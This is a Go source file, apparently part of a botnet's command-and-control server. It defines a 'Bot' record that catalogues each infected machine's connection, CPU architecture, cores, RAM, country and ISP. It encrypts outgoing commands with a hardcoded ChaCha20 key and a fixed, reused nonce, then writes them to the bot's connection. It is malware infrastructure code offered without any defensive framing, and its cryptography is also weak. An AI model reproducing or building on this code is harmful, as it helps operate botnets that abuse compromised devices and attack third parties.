package slaves

import (
	"crypto/cipher"
	"net"

	"golang.org/x/crypto/chacha20"
)

type Bot struct {
	uid     int
	conn    net.Conn
	version byte
	Source  string
	Arch    string
	Cores   int
	Ram     int
	Country string
	ISP     string
	
	cipher cipher.Stream
	nonce  []byte
}


var encryptionKey = []byte{
    0x8F, 0x34, 0xA2, 0x5D, 0xC9, 0x1E, 0x8B, 0x37,
    0xF2, 0x6C, 0x29, 0xB4, 0x40, 0xE7, 0x7A, 0x95,
    0x0C, 0xB3, 0x68, 0xDF, 0x46, 0xFD, 0xA8, 0x13,
    0x8E, 0x25, 0x9C, 0x03, 0xBA, 0x71, 0xD8, 0x4F,
}

func NewBot(conn net.Conn, version byte, source string, arch string, cores int, ram int, country string, isp string) *Bot {
	return &Bot{-1, conn, version, source, arch, cores, ram, country, isp, nil, nil}
}



func (b *Bot) InitEncryption(remoteAddr string) error {
	
	
	b.nonce = make([]byte, 12)

	
	authMagic := []byte{0x71, 0xBF, 0x9A, 0x38}

	
	copy(b.nonce[0:4], authMagic)
	copy(b.nonce[4:8], authMagic)
	copy(b.nonce[8:12], authMagic)

	
	cipher, err := chacha20.NewUnauthenticatedCipher(encryptionKey, b.nonce)
	if err != nil {
		return err
	}

	b.cipher = cipher
	return nil
}

func (b *Bot) QueueBuf(buf []byte) {
	if len(buf) < 2 {
		
		return
	}

	
	
	lengthPrefix := buf[0:2]
	payload := buf[2:]

	
	if b.cipher != nil && len(payload) > 0 {
		encrypted := make([]byte, len(payload))
		b.cipher.XORKeyStream(encrypted, payload)
		payload = encrypted
	}

	
	_, err := b.conn.Write(lengthPrefix)
	if err != nil {
		return
	}

	if len(payload) > 0 {
		_, err = b.conn.Write(payload)
		if err != nil {
			return
		}
	}
}
